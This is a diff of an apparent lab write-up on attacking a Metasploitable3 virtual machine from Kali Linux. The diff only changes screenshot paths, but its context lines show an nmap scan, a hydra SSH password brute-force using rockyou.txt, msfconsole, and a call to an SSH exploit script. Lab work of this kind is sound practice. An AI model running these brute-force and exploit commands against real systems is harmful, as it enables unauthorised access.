@@ -9,12 +9,12 @@
 - **Attacker Machine:** Kali Linux
   - IP Address: `192.168.8.164/24`
   
-  <img src="Phase1/task1.1_screenshots/AttackerIP.png" width="500"/>
+  <img src="task1.1_screenshots/AttackerIP.png" width="500"/>
 
 - **Victim Machine:** Metasploitable3 Ubuntu 14.04
   - IP Address: `192.168.8.165/24`
   
-  <img src="Phase1/task1.1_screenshots/victimIP.png" width="500"/>
+  <img src="task1.1_screenshots/victimIP.png" width="500"/>
 
 ---
 
@@ -28,7 +28,7 @@ Verified communication:
 ping 192.168.8.165
 ```
 
-<img src="Phase1/task1.1_screenshots/pingFromAttackerToVictim.png" width="500"/>
+<img src="task1.1_screenshots/pingFromAttackerToVictim.png" width="500"/>
 
 ---
 
@@ -40,7 +40,7 @@ Discovering services:
 nmap -sV 192.168.8.165
 ```
 
-<img src="Phase1/task1.1_screenshots/nmapC.png" width="500"/>
+<img src="task1.1_screenshots/nmapC.png" width="500"/>
 
 ---
 
@@ -50,7 +50,7 @@ nmap -sV 192.168.8.165
 hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.165
 ```
 
-<img src="Phase1/task1.1_screenshots/hydra.png" width="500"/>
+<img src="task1.1_screenshots/hydra.png" width="500"/>
 
 ---
 
@@ -60,7 +60,7 @@ hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.165
 sudo msfconsole
 ```
 
-<img src="Phase1/task1.1_screenshots/metasploit.png" width="500"/>
+<img src="task1.1_screenshots/metasploit.png" width="500"/>
 
 ---
 
@@ -133,7 +133,7 @@ def ssh_connect(ip, port, user, passwd):
 ssh_connect(target_ip, port, username, password)
 ```
 
-<img src="Phase1/task1.2_screenshots/script.png" width="500"/>
+<img src="task1.2_screenshots/script.png" width="500"/>
 
 ---
 
@@ -143,7 +143,7 @@ ssh_connect(target_ip, port, username, password)
 python3 ssh_exploit.py
 ```
 
-<img src="Phase1/task1.2_screenshots/excuteFile.png" width="500"/>
+<img src="task1.2_screenshots/excuteFile.png" width="500"/>
 
 ---
 
